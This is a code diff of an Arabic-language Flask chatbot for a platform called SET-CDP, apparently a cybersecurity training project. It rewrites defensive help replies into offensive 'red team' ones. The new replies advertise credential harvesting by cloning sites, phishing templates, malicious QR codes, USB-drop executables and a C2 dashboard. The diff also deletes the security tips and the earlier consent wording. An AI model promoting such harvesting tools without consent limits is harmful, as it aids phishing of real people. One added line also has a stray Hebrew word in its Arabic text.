         return make_reply(
             (
-                "متجر إضافات SET-CDP يحتوي على إضافات دفاعية للمتصفح مثل WebShield، CookieShield، وAdShield. "
-                "هذه الإضافات تساعد في فحص الروابط، فهم ملفات الارتباط، تقليل التتبع، وتعزيز وعي المستخدم أثناء التصفح."
+                "إضافات المتصفح (Cyber Plugins) توفر طبقة حماية استباقية. "
+                "مثل WebShield لحظر النطاقات الخبيثة، CookieShield لتأمين الجلسات، و AdShield لحجب التتبع وعرقلة هجمات حقن الإعلانات."
             ),
             "extensions",
-            suggestions=[
-                "ما هي WebShield؟",
-                "ما هي CookieShield؟",
-                "ما هي AdShield؟"
-            ],
-            quick_links=[
-                {"title": "متجر الإضافات", "url": "/extensions"}
-            ]
-        )
-
-    # WebShield
-    if has_any(msg, ["webshield", "web shield", "ويب شيلد"]):
-        return make_reply(
-            (
-                "WebShield هي إضافة دفاعية تساعد المستخدم على تقييم مخاطر الروابط والصفحات أثناء التصفح، "
-                "وتقدم مؤشرات تحذيرية مثل الروابط المختصرة، HTTP، النطاقات الغريبة، وبعض علامات التصيد."
-            ),
-            "webshield",
-            quick_links=[
-                {"title": "الإضافات", "url": "/extensions"}
-            ]
-        )
-
-    # CookieShield
-    if has_any(msg, ["cookieshield", "cookie shield", "كوكي", "ملفات الارتباط", "cookies"]):
-        return make_reply(
-            (
-                "CookieShield هي إضافة دفاعية تساعد على فهم ملفات الارتباط وتقييم مخاطرها مثل غياب Secure أو HttpOnly أو SameSite. "
-                "الهدف منها تعليمي ودفاعي، ولا تعتمد على عرض أو تسريب القيم الحساسة للكوكيز."
-            ),
-            "cookieshield",
-            suggestions=[
-                "ما هي ملفات الارتباط؟",
-                "كيف أحمي الخصوصية؟"
-            ],
-            quick_links=[
-                {"title": "الإضافات", "url": "/extensions"}
-            ]
-        )
-
-    # AdShield
-    if has_any(msg, ["adshield", "ad shield", "اعلانات", "إعلانات", "تتبع", "tracker", "tracking"]):
-        return make_reply(
-            (
-                "AdShield هي إضافة تساعد على تقليل الإعلانات والتتبع داخل المتصفح، "
-                "وتوضح مفهوم حماية الخصوصية وتقليل الاتصالات غير الضرورية مع جهات التتبع."
-            ),
-            "adshield",
-            quick_links=[
-                {"title": "الإضافات", "url": "/extensions"}
-            ]
+            quick_links=[{"title": "متجر الإضافات", "url": "/extensions"}]
         )
 
     # =====================================================
-    # Templates / Awareness Simulation
+    # Red Teaming / Attack / Simulation
     # =====================================================
-    if has_any(msg, ["قوالب", "templates", "facebook", "instagram", "linkedin", "university", "محاكاه", "محاكاة"]):
+    if has_any(msg, ["attack", "هجوم", "محاكاة", "استنساخ", "clone", "تصيد", "phishing", "usb drop", "quishing"]):
         return make_reply(
             (
-                "صفحة القوالب الجاهزة تحتوي على قوالب تدريبية للتوعية بمخاطر الصفحات المزيفة والهندسة الاجتماعية. "
-                "استخدامها يجب أن يكون داخل بيئة تدريبية وبموافقة واضحة، والهدف هو التعليم وليس جمع بيانات حقيقية."
+                "مسرح العمليات (Red Team Module) يوفر أدوات متقدمة: "
+                "1. Credential Harvesting (لاستنساخ الأهداف). "
+                "2. SocEng Payloads (قوالب تصيد جاهزة). "
+                "3. Quishing (توليد QR ملغم). "
+                "4. USB Drop (إنشاء ملفات تنفيذية للاختراق المادي)."
             ),
-            "templates",
-            quick_links=[
-                {"title": "القوالب الجاهزة", "url": "/ready_templates"}
-            ]
+            "red_team",
+            quick_links=[{"title": "مسرح العمليات", "url": "/attack"}]
         )
 
     # =====================================================
-    # Quiz
+    # Quiz / Readiness
     # =====================================================
-    if has_any(msg, ["امتحان", "quiz", "اختبار", "اسئله", "أسئلة", "نتائج"]):
+    if has_any(msg, ["امتحان", "quiz", "اختبار", "اسئله", "أسئلة", "نتائج", "جاهزية", "readiness"]):
         return make_reply(
             (
-                "قسم الامتحان يستخدم لقياس وعي المستخدمين بالأمن السيبراني. "
-                "يمكن للمستخدم تقديم الامتحان، بينما يستطيع الأدمن إدارة الأسئلة ومراجعة النتائج والتقارير."
+                "اختبار الجاهزية (Readiness Quiz) يقيس مستوى الوعي الأمني للكادر البشري. "
+                "يتضمن محاكاة لأسئلة تقيم قدرتهم على كشف هجمات الهندسة الاجتماعية وحماية الأصول الرقمية."
             ),
             "quiz",
-            quick_links=[
-                {"title": "تقديم الامتحان", "url": "/quiz"},
-                {"title": "لوحة التحكم", "url": "/dashboard"}
-            ]
+            quick_links=[{"title": "بدء التقييم", "url": "/quiz"}]
         )
 
     # =====================================================
     # Dashboard / Reports
     # =====================================================
-    if has_any(msg, ["dashboard", "لوحه التحكم", "لوحة التحكم", "تقارير", "reports", "سجل", "history", "scans"]):
+    if has_any(msg, ["dashboard", "لوحه التحكم", "لوحة التحكم", "تقارير", "reports", "سجل", "history", "scans", "c2"]):
         return make_reply(
             (
-                "لوحة التحكم تعرض سجل الفحوصات والعمليات التعليمية ونتائج المستخدمين حسب الصلاحيات. "
-                "أما التقارير فتساعد الأدمن على متابعة نتائج الاختبارات ونشاط المنصة بشكل منظم."
+                "لوحة القيادة (C2 Dashboard) تعرض سجل العمليات (Op Logs) وأهداف المحاكاة النشطة. "
+                "بينما يقوم مركز التقارير (Reports Center) بإنشاء ملخص تنفيذي وإحصاءات حية للأنشطة الهجومية والدفاعية المنجزة."
             ),
             "dashboard",
             quick_links=[
-                {"title": "لوحة التحكم", "url": "/dashboard"},
-                {"title": "التقارير", "url": "/reports"}
+                {"title": "C2 Dashboard", "url": "/dashboard"},
+                {"title": "تقارير العمليات", "url": "/reports"}
             ]
         )
 
     # =====================================================
-    # Threat Library
+    # Threat Library (Intel)
     # =====================================================
-    if has_any(msg, ["مكتبه التهديدات", "مكتبة التهديدات", "threat", "threat library", "تهديدات", "مخاطر"]):
+    if has_any(msg, ["مكتبه التهديدات", "مكتبة التهديدات", "threat", "threat library", "تهديدات", "مخاطر", "intel"]):
         return make_reply(
             (
-                "مكتبة التهديدات تعرض أنواعاً مختلفة من المخاطر السيبرانية مع شرح طريقة عملها، "
-                "مستوى خطورتها، وطرق الوقاية منها. وهي جزء مهم من الجانب التوعوي في SET-CDP."
+                "مكتبة التهديدات (Threat Intel Database) هي قاعدة استخباراتية تفصل التكتيكات والتقنيات والإجراءات (TTPs) "
+                "الخاصة بالمهاجمين، وتوفر أساليب التصدي الاستباقية للحد من المخاطر."
             ),
             "threat_library",
-            quick_links=[
-                {"title": "مكتبة التهديدات", "url": "/threat-library"}
-            ]
+            quick_links=[{"title": "قاعدة الاستخبارات (Threat Intel)", "url": "/threat-library"}]
         )
 
     # =====================================================
-    # Privacy / Ethics
+    # Privacy / ROE
     # =====================================================
-    if has_any(msg, ["خصوصيه", "خصوصية", "اخلاقي", "أخلاقي", "ethics", "privacy", "امان البيانات"]):
+    if has_any(msg, ["خصوصيه", "خصوصية", "اخلاقي", "أخلاقي", "ethics", "privacy", "امان البيانات", "roe", "قواعد الاشتباك"]):
         return make_reply(
             (
-                "SET-CDP مبنية للاستخدام الأكاديمي والتدريبي فقط. الأدوات الحساسة مثل تحليل كلمة المرور والهاش "
-                "يمكن أن تعمل محلياً داخل المتصفح، والهدف هو التوعية والفحص الدفاعي دون جمع بيانات حقيقية أو استهداف غير مصرح به."
+                "[ROE ALERT] منصة SET-CDP تلتزم بقواعد اشتباك صارمة. الاستخدام مقتصر على التقييم האكاديمي (Authorized Simulation). "
+                "يمنع استهداف أنظمة أو مستخدمين خارج نطاق الاختبار. جميع الأنشطة تخضع لتدقيق الإدارة."
             ),
             "privacy_ethics"
         )
 
     # =====================================================
-    # Security Tips
-    # =====================================================
-    if has_any(msg, ["نصيحه", "نصيحة", "احمي", "حمايه", "حماية", "safe", "security tips", "نصائح", "2fa", "مصادقه", "مصادقة"]):
-        return make_reply(
-            (
-                "نصائح مهمة: لا تدخل بياناتك في روابط غير موثوقة، تأكد من HTTPS واسم النطاق، فعّل المصادقة الثنائية، "
-                "استخدم كلمات مرور قوية ومختلفة، لا تفتح مرفقات مجهولة، وحدّث النظام والمتصفح باستمرار."
-            ),
-            "tips",
-            suggestions=[
-                "كيف أفحص رابط؟",
-                "كيف أختار كلمة مرور قوية؟",
-                "ما هو SSL؟"
-            ]
-        )
-
-    # =====================================================
     # Run / Install / GitHub
     # =====================================================
-    if has_any(msg, ["تشغيل", "run", "github", "تثبيت", "install", "flask", "requirements", "python app"]):
+    if has_any(msg, ["تشغيل", "run", "github", "تثبيت", "install", "flask", "requirements", "python app", "setup"]):
         return make_reply(
             (
-                "لتشغيل المشروع: ثبّت المتطلبات من requirements.txt، ثم شغّل app.py، وبعدها افتح المتصفح على "
-                "http://127.0.0.1:5000. تأكد من تهيئة قاعدة البيانات وتسجيل الدخول للوصول للوحة التحكم والأدوات الإدارية."
+                "[DEPLOYMENT] لنشر الترسانة: 1. ثبّت المكتبات من requirements.txt. 2. أطلق خادم القيادة عبر `python app.py`. "
+                "3. افتح المنفذ 5000 محلياً وسجل دخولك ببيانات الأدمن لفتح وحدات الهجوم والمراقبة."
             ),
-            "run",
-            suggestions=[
-                "كيف أشغل Agent؟",
-                "أين أجد لوحة التحكم؟"
-            ]
+            "run"
         )
 
     # =====================================================
-    # Fallback
+    # Fallback (Unknown Command)
     # =====================================================
     return make_reply(
         (
-            "لم أفهم السؤال بشكل كامل، لكن يمكنني مساعدتك في: أدوات الفحص، SSL، فحص الروابط، "
-            "كلمات المرور، تحليل الملفات، Mini-EDR، Endpoint Agent، الإضافات، القوالب، الامتحان، "
-            "مكتبة التهديدات، ونصائح الحماية."
+            "[CMD_UNKNOWN] الأمر غير واضح. هل تبحث عن بيانات حول أدوات الاستطلاع (Recon)، "
+            "أدوات المحاكاة الهجومية (Payloads)، المراقبة (SOC)، أم قاعدة التهديدات الاستخباراتية (Threat Intel)؟"
         ),
         "fallback",
         suggestions=[
-            "ما هي SET-CDP؟",
-            "كيف أفحص رابط؟",
-            "ما هو Mini-EDR؟",
-            "ما هي CookieShield؟"
+            "كيف أنفذ هجوم استنساخ؟",
+            "كيف أستطلع النطاقات؟",
+            "كيف أشغل Endpoint Agent؟"
         ]
     )
-
 
 @app.route("/api/chatbot", methods=["POST"])
 def api_chatbot():
@@ -2828,17 +2773,17 @@ def api_chatbot():
 
         if is_rate_limited(client_ip):
             return jsonify(make_reply(
-                "تم إرسال أسئلة كثيرة خلال وقت قصير. انتظر قليلاً ثم حاول مرة أخرى.",
+                "[SYS_WARN] تم رصد معدل استعلامات مفرط (Rate Limit Exceeded). يرجى التريث قبل إرسال طلب جديد.",
                 "rate_limit"
             )), 429
 
         data = request.get_json(silent=True) or {}
         message = str(data.get("message", "")).strip()
 
-        # حد أقصى لحجم السؤال للحماية
+        # حد أقصى لحجم السؤال للحماية (Buffer Limit)
         if len(message) > 1000:
             return jsonify(make_reply(
-                "السؤال طويل جداً. اختصره قليلاً وسأساعدك.",
+                "[SYS_ERROR] الإدخال يتجاوز الحد الأقصى للمخزن المؤقت (Buffer Limit). يرجى اختصار الأمر.",
                 "limit"
             )), 400
 
@@ -2847,7 +2792,7 @@ def api_chatbot():
 
     except Exception as e:
         return jsonify(make_reply(
-            "حدث خطأ أثناء معالجة السؤال. حاول مرة أخرى.",
+            "[SYS_CRITICAL] فشل في معالجة الأمر داخل وحدة الذكاء الاصطناعي. أعد المحاولة.",
             "error"
         )), 500
 # ============================================================
